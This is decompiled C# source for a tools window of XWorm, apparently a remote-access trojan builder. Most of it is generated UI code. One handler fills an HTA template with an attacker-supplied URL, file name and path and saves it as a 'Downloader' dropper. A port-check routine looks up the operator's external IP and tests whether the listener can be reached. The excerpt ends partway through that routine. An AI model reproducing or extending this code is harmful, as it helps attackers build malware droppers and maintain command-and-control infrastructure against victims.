using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SimpleObfuscator;
using XWorm.My;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000031 RID: 49
	[DesignerGenerated]
	public partial class ToolsBox : Form
	{
		// Token: 0x17000335 RID: 821
		// (get) Token: 0x060008C6 RID: 2246 RVA: 0x0004F263 File Offset: 0x0004D463
		// (set) Token: 0x060008C7 RID: 2247 RVA: 0x0004F26D File Offset: 0x0004D46D
		internal virtual Guna2TabControl Guna2TabControl1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000336 RID: 822
		// (get) Token: 0x060008C8 RID: 2248 RVA: 0x0004F276 File Offset: 0x0004D476
		// (set) Token: 0x060008C9 RID: 2249 RVA: 0x0004F280 File Offset: 0x0004D480
		internal virtual TabPage TabPage1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000337 RID: 823
		// (get) Token: 0x060008CA RID: 2250 RVA: 0x0004F289 File Offset: 0x0004D489
		// (set) Token: 0x060008CB RID: 2251 RVA: 0x0004F293 File Offset: 0x0004D493
		internal virtual TabPage TabPage2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000338 RID: 824
		// (get) Token: 0x060008CC RID: 2252 RVA: 0x0004F29C File Offset: 0x0004D49C
		// (set) Token: 0x060008CD RID: 2253 RVA: 0x0004F2A6 File Offset: 0x0004D4A6
		internal virtual TabPage TabPage3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000339 RID: 825
		// (get) Token: 0x060008CE RID: 2254 RVA: 0x0004F2AF File Offset: 0x0004D4AF
		// (set) Token: 0x060008CF RID: 2255 RVA: 0x0004F2B9 File Offset: 0x0004D4B9
		internal virtual TabPage TabPage4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033A RID: 826
		// (get) Token: 0x060008D0 RID: 2256 RVA: 0x0004F2C2 File Offset: 0x0004D4C2
		// (set) Token: 0x060008D1 RID: 2257 RVA: 0x0004F2CC File Offset: 0x0004D4CC
		internal virtual ImageList ImageList1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033B RID: 827
		// (get) Token: 0x060008D2 RID: 2258 RVA: 0x0004F2D5 File Offset: 0x0004D4D5
		// (set) Token: 0x060008D3 RID: 2259 RVA: 0x0004F2DF File Offset: 0x0004D4DF
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033C RID: 828
		// (get) Token: 0x060008D4 RID: 2260 RVA: 0x0004F2E8 File Offset: 0x0004D4E8
		// (set) Token: 0x060008D5 RID: 2261 RVA: 0x0004F2F2 File Offset: 0x0004D4F2
		internal virtual Guna2TextBox Guna2TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033D RID: 829
		// (get) Token: 0x060008D6 RID: 2262 RVA: 0x0004F2FB File Offset: 0x0004D4FB
		// (set) Token: 0x060008D7 RID: 2263 RVA: 0x0004F305 File Offset: 0x0004D505
		internal virtual Guna2TextBox Guna2TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033E RID: 830
		// (get) Token: 0x060008D8 RID: 2264 RVA: 0x0004F30E File Offset: 0x0004D50E
		// (set) Token: 0x060008D9 RID: 2265 RVA: 0x0004F318 File Offset: 0x0004D518
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700033F RID: 831
		// (get) Token: 0x060008DA RID: 2266 RVA: 0x0004F321 File Offset: 0x0004D521
		// (set) Token: 0x060008DB RID: 2267 RVA: 0x0004F32C File Offset: 0x0004D52C
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x17000340 RID: 832
		// (get) Token: 0x060008DC RID: 2268 RVA: 0x0004F36F File Offset: 0x0004D56F
		// (set) Token: 0x060008DD RID: 2269 RVA: 0x0004F379 File Offset: 0x0004D579
		internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000341 RID: 833
		// (get) Token: 0x060008DE RID: 2270 RVA: 0x0004F382 File Offset: 0x0004D582
		// (set) Token: 0x060008DF RID: 2271 RVA: 0x0004F38C File Offset: 0x0004D58C
		internal virtual Guna2ComboBox Guna2ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000342 RID: 834
		// (get) Token: 0x060008E0 RID: 2272 RVA: 0x0004F395 File Offset: 0x0004D595
		// (set) Token: 0x060008E1 RID: 2273 RVA: 0x0004F39F File Offset: 0x0004D59F
		internal virtual SaveFileDialog SaveFileDialog1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000343 RID: 835
		// (get) Token: 0x060008E2 RID: 2274 RVA: 0x0004F3A8 File Offset: 0x0004D5A8
		// (set) Token: 0x060008E3 RID: 2275 RVA: 0x0004F3B4 File Offset: 0x0004D5B4
		internal virtual Guna2GradientButton Guna2GradientButton2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton2_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton2 = value;
				guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x17000344 RID: 836
		// (get) Token: 0x060008E4 RID: 2276 RVA: 0x0004F3F7 File Offset: 0x0004D5F7
		// (set) Token: 0x060008E5 RID: 2277 RVA: 0x0004F401 File Offset: 0x0004D601
		internal virtual Guna2TextBox Guna2TextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000345 RID: 837
		// (get) Token: 0x060008E6 RID: 2278 RVA: 0x0004F40A File Offset: 0x0004D60A
		// (set) Token: 0x060008E7 RID: 2279 RVA: 0x0004F414 File Offset: 0x0004D614
		internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000346 RID: 838
		// (get) Token: 0x060008E8 RID: 2280 RVA: 0x0004F41D File Offset: 0x0004D61D
		// (set) Token: 0x060008E9 RID: 2281 RVA: 0x0004F427 File Offset: 0x0004D627
		internal virtual Guna2TextBox Guna2TextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000347 RID: 839
		// (get) Token: 0x060008EA RID: 2282 RVA: 0x0004F430 File Offset: 0x0004D630
		// (set) Token: 0x060008EB RID: 2283 RVA: 0x0004F43A File Offset: 0x0004D63A
		internal virtual Guna2TextBox Guna2TextBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000348 RID: 840
		// (get) Token: 0x060008EC RID: 2284 RVA: 0x0004F443 File Offset: 0x0004D643
		// (set) Token: 0x060008ED RID: 2285 RVA: 0x0004F44D File Offset: 0x0004D64D
		internal virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000349 RID: 841
		// (get) Token: 0x060008EE RID: 2286 RVA: 0x0004F456 File Offset: 0x0004D656
		// (set) Token: 0x060008EF RID: 2287 RVA: 0x0004F460 File Offset: 0x0004D660
		internal virtual Guna2TextBox Guna2TextBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700034A RID: 842
		// (get) Token: 0x060008F0 RID: 2288 RVA: 0x0004F469 File Offset: 0x0004D669
		// (set) Token: 0x060008F1 RID: 2289 RVA: 0x0004F473 File Offset: 0x0004D673
		internal virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700034B RID: 843
		// (get) Token: 0x060008F2 RID: 2290 RVA: 0x0004F47C File Offset: 0x0004D67C
		// (set) Token: 0x060008F3 RID: 2291 RVA: 0x0004F488 File Offset: 0x0004D688
		internal virtual Guna2GradientButton Guna2GradientButton4
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton4_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton4;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton4 = value;
				guna2GradientButton = this._Guna2GradientButton4;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x1700034C RID: 844
		// (get) Token: 0x060008F4 RID: 2292 RVA: 0x0004F4CB File Offset: 0x0004D6CB
		// (set) Token: 0x060008F5 RID: 2293 RVA: 0x0004F4D8 File Offset: 0x0004D6D8
		internal virtual Guna2GradientButton Guna2GradientButton3
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton3_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton3;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton3 = value;
				guna2GradientButton = this._Guna2GradientButton3;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x1700034D RID: 845
		// (get) Token: 0x060008F6 RID: 2294 RVA: 0x0004F51B File Offset: 0x0004D71B
		// (set) Token: 0x060008F7 RID: 2295 RVA: 0x0004F525 File Offset: 0x0004D725
		internal virtual PictureBox PictureBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700034E RID: 846
		// (get) Token: 0x060008F8 RID: 2296 RVA: 0x0004F52E File Offset: 0x0004D72E
		// (set) Token: 0x060008F9 RID: 2297 RVA: 0x0004F538 File Offset: 0x0004D738
		internal virtual ListView L1
		{
			[CompilerGenerated]
			get
			{
				return this._L1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				DragEventHandler value2 = new DragEventHandler(this.L1_DragDrop);
				DragEventHandler value3 = new DragEventHandler(this.L1_DragEnter);
				KeyEventHandler value4 = new KeyEventHandler(this.L1_KeyDown);
				ListView l = this._L1;
				if (l != null)
				{
					l.DragDrop -= value2;
					l.DragEnter -= value3;
					l.KeyDown -= value4;
				}
				this._L1 = value;
				l = this._L1;
				if (l != null)
				{
					l.DragDrop += value2;
					l.DragEnter += value3;
					l.KeyDown += value4;
				}
			}
		}

		// Token: 0x1700034F RID: 847
		// (get) Token: 0x060008FA RID: 2298 RVA: 0x0004F5B1 File Offset: 0x0004D7B1
		// (set) Token: 0x060008FB RID: 2299 RVA: 0x0004F5BB File Offset: 0x0004D7BB
		internal virtual ColumnHeader ColumnHeader1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000350 RID: 848
		// (get) Token: 0x060008FC RID: 2300 RVA: 0x0004F5C4 File Offset: 0x0004D7C4
		// (set) Token: 0x060008FD RID: 2301 RVA: 0x0004F5CE File Offset: 0x0004D7CE
		internal virtual ColumnHeader ColumnHeader2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000351 RID: 849
		// (get) Token: 0x060008FE RID: 2302 RVA: 0x0004F5D7 File Offset: 0x0004D7D7
		// (set) Token: 0x060008FF RID: 2303 RVA: 0x0004F5E1 File Offset: 0x0004D7E1
		internal virtual ColumnHeader ColumnHeader3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000352 RID: 850
		// (get) Token: 0x06000900 RID: 2304 RVA: 0x0004F5EA File Offset: 0x0004D7EA
		// (set) Token: 0x06000901 RID: 2305 RVA: 0x0004F5F4 File Offset: 0x0004D7F4
		internal virtual ColumnHeader ColumnHeader4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000353 RID: 851
		// (get) Token: 0x06000902 RID: 2306 RVA: 0x0004F5FD File Offset: 0x0004D7FD
		// (set) Token: 0x06000903 RID: 2307 RVA: 0x0004F607 File Offset: 0x0004D807
		internal virtual Guna2Panel Guna2Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000354 RID: 852
		// (get) Token: 0x06000904 RID: 2308 RVA: 0x0004F610 File Offset: 0x0004D810
		// (set) Token: 0x06000905 RID: 2309 RVA: 0x0004F61C File Offset: 0x0004D81C
		internal virtual Guna2GradientButton Guna2GradientButton5
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton5;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton5_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton5;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton5 = value;
				guna2GradientButton = this._Guna2GradientButton5;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x17000355 RID: 853
		// (get) Token: 0x06000906 RID: 2310 RVA: 0x0004F65F File Offset: 0x0004D85F
		// (set) Token: 0x06000907 RID: 2311 RVA: 0x0004F669 File Offset: 0x0004D869
		internal virtual Label Label7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000356 RID: 854
		// (get) Token: 0x06000908 RID: 2312 RVA: 0x0004F672 File Offset: 0x0004D872
		// (set) Token: 0x06000909 RID: 2313 RVA: 0x0004F67C File Offset: 0x0004D87C
		internal virtual Guna2ComboBox Guna2ComboBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000357 RID: 855
		// (get) Token: 0x0600090A RID: 2314 RVA: 0x0004F685 File Offset: 0x0004D885
		// (set) Token: 0x0600090B RID: 2315 RVA: 0x0004F690 File Offset: 0x0004D890
		internal virtual Guna2CheckBox Guna2CheckBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2CheckBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2CheckBox1_CheckedChanged);
				Guna2CheckBox guna2CheckBox = this._Guna2CheckBox1;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged -= value2;
				}
				this._Guna2CheckBox1 = value;
				guna2CheckBox = this._Guna2CheckBox1;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x17000358 RID: 856
		// (get) Token: 0x0600090C RID: 2316 RVA: 0x0004F6D3 File Offset: 0x0004D8D3
		// (set) Token: 0x0600090D RID: 2317 RVA: 0x0004F6E0 File Offset: 0x0004D8E0
		internal virtual Guna2CheckBox Guna2CheckBox2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2CheckBox2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2CheckBox2_CheckedChanged);
				Guna2CheckBox guna2CheckBox = this._Guna2CheckBox2;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged -= value2;
				}
				this._Guna2CheckBox2 = value;
				guna2CheckBox = this._Guna2CheckBox2;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x17000359 RID: 857
		// (get) Token: 0x0600090E RID: 2318 RVA: 0x0004F723 File Offset: 0x0004D923
		// (set) Token: 0x0600090F RID: 2319 RVA: 0x0004F72D File Offset: 0x0004D92D
		internal virtual PictureBox PictureBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700035A RID: 858
		// (get) Token: 0x06000910 RID: 2320 RVA: 0x0004F736 File Offset: 0x0004D936
		// (set) Token: 0x06000911 RID: 2321 RVA: 0x0004F740 File Offset: 0x0004D940
		internal virtual Guna2CheckBox Guna2CheckBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700035B RID: 859
		// (get) Token: 0x06000912 RID: 2322 RVA: 0x0004F749 File Offset: 0x0004D949
		// (set) Token: 0x06000913 RID: 2323 RVA: 0x0004F753 File Offset: 0x0004D953
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700035C RID: 860
		// (get) Token: 0x06000914 RID: 2324 RVA: 0x0004F75C File Offset: 0x0004D95C
		// (set) Token: 0x06000915 RID: 2325 RVA: 0x0004F768 File Offset: 0x0004D968
		internal virtual ToolStripMenuItem AddToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._AddToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.AddToolStripMenuItem1_Click);
				ToolStripMenuItem addToolStripMenuItem = this._AddToolStripMenuItem1;
				if (addToolStripMenuItem != null)
				{
					addToolStripMenuItem.Click -= value2;
				}
				this._AddToolStripMenuItem1 = value;
				addToolStripMenuItem = this._AddToolStripMenuItem1;
				if (addToolStripMenuItem != null)
				{
					addToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700035D RID: 861
		// (get) Token: 0x06000916 RID: 2326 RVA: 0x0004F7AB File Offset: 0x0004D9AB
		// (set) Token: 0x06000917 RID: 2327 RVA: 0x0004F7B8 File Offset: 0x0004D9B8
		internal virtual ToolStripMenuItem RemoveToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RemoveToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RemoveToolStripMenuItem1_Click);
				ToolStripMenuItem removeToolStripMenuItem = this._RemoveToolStripMenuItem1;
				if (removeToolStripMenuItem != null)
				{
					removeToolStripMenuItem.Click -= value2;
				}
				this._RemoveToolStripMenuItem1 = value;
				removeToolStripMenuItem = this._RemoveToolStripMenuItem1;
				if (removeToolStripMenuItem != null)
				{
					removeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700035E RID: 862
		// (get) Token: 0x06000918 RID: 2328 RVA: 0x0004F7FB File Offset: 0x0004D9FB
		// (set) Token: 0x06000919 RID: 2329 RVA: 0x0004F808 File Offset: 0x0004DA08
		internal virtual ToolStripMenuItem ToolStripMenuItem7
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem7;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem7_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem7;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem7 = value;
				toolStripMenuItem = this._ToolStripMenuItem7;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700035F RID: 863
		// (get) Token: 0x0600091A RID: 2330 RVA: 0x0004F84B File Offset: 0x0004DA4B
		// (set) Token: 0x0600091B RID: 2331 RVA: 0x0004F855 File Offset: 0x0004DA55
		internal virtual ImageList ImageList2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000360 RID: 864
		// (get) Token: 0x0600091C RID: 2332 RVA: 0x0004F85E File Offset: 0x0004DA5E
		// (set) Token: 0x0600091D RID: 2333 RVA: 0x0004F868 File Offset: 0x0004DA68
		internal virtual ToolStripMenuItem RunningToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000361 RID: 865
		// (get) Token: 0x0600091E RID: 2334 RVA: 0x0004F871 File Offset: 0x0004DA71
		// (set) Token: 0x0600091F RID: 2335 RVA: 0x0004F87B File Offset: 0x0004DA7B
		internal virtual ToolStripMenuItem RunonceToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000362 RID: 866
		// (get) Token: 0x06000920 RID: 2336 RVA: 0x0004F884 File Offset: 0x0004DA84
		// (set) Token: 0x06000921 RID: 2337 RVA: 0x0004F890 File Offset: 0x0004DA90
		internal virtual ToolStripMenuItem TrueToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._TrueToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TrueToolStripMenuItem_Click);
				ToolStripMenuItem trueToolStripMenuItem = this._TrueToolStripMenuItem;
				if (trueToolStripMenuItem != null)
				{
					trueToolStripMenuItem.Click -= value2;
				}
				this._TrueToolStripMenuItem = value;
				trueToolStripMenuItem = this._TrueToolStripMenuItem;
				if (trueToolStripMenuItem != null)
				{
					trueToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000363 RID: 867
		// (get) Token: 0x06000922 RID: 2338 RVA: 0x0004F8D3 File Offset: 0x0004DAD3
		// (set) Token: 0x06000923 RID: 2339 RVA: 0x0004F8E0 File Offset: 0x0004DAE0
		internal virtual ToolStripMenuItem FalseToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._FalseToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FalseToolStripMenuItem_Click);
				ToolStripMenuItem falseToolStripMenuItem = this._FalseToolStripMenuItem;
				if (falseToolStripMenuItem != null)
				{
					falseToolStripMenuItem.Click -= value2;
				}
				this._FalseToolStripMenuItem = value;
				falseToolStripMenuItem = this._FalseToolStripMenuItem;
				if (falseToolStripMenuItem != null)
				{
					falseToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000364 RID: 868
		// (get) Token: 0x06000924 RID: 2340 RVA: 0x0004F923 File Offset: 0x0004DB23
		// (set) Token: 0x06000925 RID: 2341 RVA: 0x0004F930 File Offset: 0x0004DB30
		internal virtual ToolStripMenuItem TrueToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._TrueToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TrueToolStripMenuItem1_Click);
				ToolStripMenuItem trueToolStripMenuItem = this._TrueToolStripMenuItem1;
				if (trueToolStripMenuItem != null)
				{
					trueToolStripMenuItem.Click -= value2;
				}
				this._TrueToolStripMenuItem1 = value;
				trueToolStripMenuItem = this._TrueToolStripMenuItem1;
				if (trueToolStripMenuItem != null)
				{
					trueToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000365 RID: 869
		// (get) Token: 0x06000926 RID: 2342 RVA: 0x0004F973 File Offset: 0x0004DB73
		// (set) Token: 0x06000927 RID: 2343 RVA: 0x0004F980 File Offset: 0x0004DB80
		internal virtual ToolStripMenuItem FalseToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._FalseToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FalseToolStripMenuItem1_Click);
				ToolStripMenuItem falseToolStripMenuItem = this._FalseToolStripMenuItem1;
				if (falseToolStripMenuItem != null)
				{
					falseToolStripMenuItem.Click -= value2;
				}
				this._FalseToolStripMenuItem1 = value;
				falseToolStripMenuItem = this._FalseToolStripMenuItem1;
				if (falseToolStripMenuItem != null)
				{
					falseToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000366 RID: 870
		// (get) Token: 0x06000928 RID: 2344 RVA: 0x0004F9C3 File Offset: 0x0004DBC3
		// (set) Token: 0x06000929 RID: 2345 RVA: 0x0004F9D0 File Offset: 0x0004DBD0
		internal virtual Guna2GradientButton Guna2GradientButton6
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton6;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton6_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton6;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton6 = value;
				guna2GradientButton = this._Guna2GradientButton6;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x0600092A RID: 2346 RVA: 0x0004FA14 File Offset: 0x0004DC14
		public ToolsBox()
		{
			base.Load += this.ToolsBox_Load;
			this.Sockets = new TcpClient();
			this.InitializeComponent();
			base.Opacity = 0.0;
			Helper.FadeIn(this, 20);
		}

		// Token: 0x0600092B RID: 2347 RVA: 0x0004FA67 File Offset: 0x0004DC67
		private void ToolsBox_Load(object sender, EventArgs e)
		{
			this.Guna2ComboBox1.SelectedIndex = 0;
			this.Guna2ComboBox2.SelectedIndex = 1;
			Control.CheckForIllegalCrossThreadCalls = false;
			this.Guna2TextBox3.Text = Conversions.ToString(SettingsHelper.Port);
		}

		// Token: 0x0600092C RID: 2348 RVA: 0x0004FAA4 File Offset: 0x0004DCA4
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Resources.HTA;
				text = text.Replace("%URL%", this.Guna2TextBox1.Text);
				text = text.Replace("%Filename%", this.Guna2TextBox2.Text);
				text = text.Replace("%Path%", this.Guna2ComboBox1.Text);
				this.SaveFileDialog1.Filter = "(*.hta)|*.hta";
				this.SaveFileDialog1.FileName = "Downloader";
				bool flag = this.SaveFileDialog1.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					StreamWriter streamWriter = new StreamWriter(this.SaveFileDialog1.FileName, false);
					streamWriter.WriteLine(text);
					streamWriter.Close();
					MessageBox.Show(this.SaveFileDialog1.FileName, "DONE!");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600092D RID: 2349 RVA: 0x0004FB9C File Offset: 0x0004DD9C
		private void Guna2GradientButton2_Click(object sender, EventArgs e)
		{
			try
			{
				this.Guna2TextBox4.ForeColor = Color.Black;
				this.Guna2TextBox4.Text = "Wait..";
				this.Guna2GradientButton2.Enabled = false;
				this.PortCheck(Convert.ToInt32(this.Guna2TextBox3.Text));
			}
			catch (Exception ex)
			{
				this.Guna2GradientButton2.Enabled = true;
				this.Guna2TextBox4.ForeColor = Color.Red;
				this.Guna2TextBox4.Text = ex.Message;
			}
		}

		// Token: 0x0600092E RID: 2350 RVA: 0x0004FC44 File Offset: 0x0004DE44
		public string GetExternalAddress()
		{
			string result;
			try
			{
				bool flag = Operators.CompareString(SettingsHelper.IP, string.Empty, false) == 0;
				if (flag)
				{
					WebClient webClient = new WebClient();
					string text = webClient.DownloadString("http://ip-api.com/csv/?fields=status,query");
					SettingsHelper.IP = text.Replace("\n", "").Split(new char[]
					{
						','
					})[1];
					result = SettingsHelper.IP;
				}
				else
				{
					result = SettingsHelper.IP;
				}
			}
			catch (Exception ex)
			{
				result = "127.0.0.1";
			}
			return result;
		}

		// Token: 0x0600092F RID: 2351 RVA: 0x0004FCDC File Offset: 0x0004DEDC
		public async void PortCheck(int Port)
		{
			try
			{
				await Task.Run(delegate()
				{
					try
					{
						bool flag = Operators.CompareString(this.GetExternalAddress(), "127.0.0.1", false) == 0;
						if (flag)
						{
							this.Guna2TextBox4.ForeColor = Color.Green;
							this.Guna2TextBox4.Text = "Success: I can see your service on 127.0.0.1 on port " + Conversions.ToString(Port);
							bool notef = SettingsHelper.NOTEF;
							if (notef)
							{
								MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "Accepted 127.0.0.1:" + Conversions.ToString(Port);
								MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
							}
						}
						else
						{
							this.Sockets = new TcpClient();
							this.Sockets.Connect(SettingsHelper.IP, Port);
							this.Guna2TextBox4.ForeColor = Color.Green;
							this.Guna2TextBox4.Text = "Success: I can see your service on " + SettingsHelper.IP + " on port " + Conversions.ToString(Port);
							bool notef2 = SettingsHelper.NOTEF;
							if (notef2)
							{
								MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "Accepted " + SettingsHelper.IP + ":" + Conversions.ToString(Port);
								MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
							}
							TcpClient sockets = this.Sockets;
							if (sockets != null)
							{
								sockets.Close();
							}
							this.Sockets = null;
						}
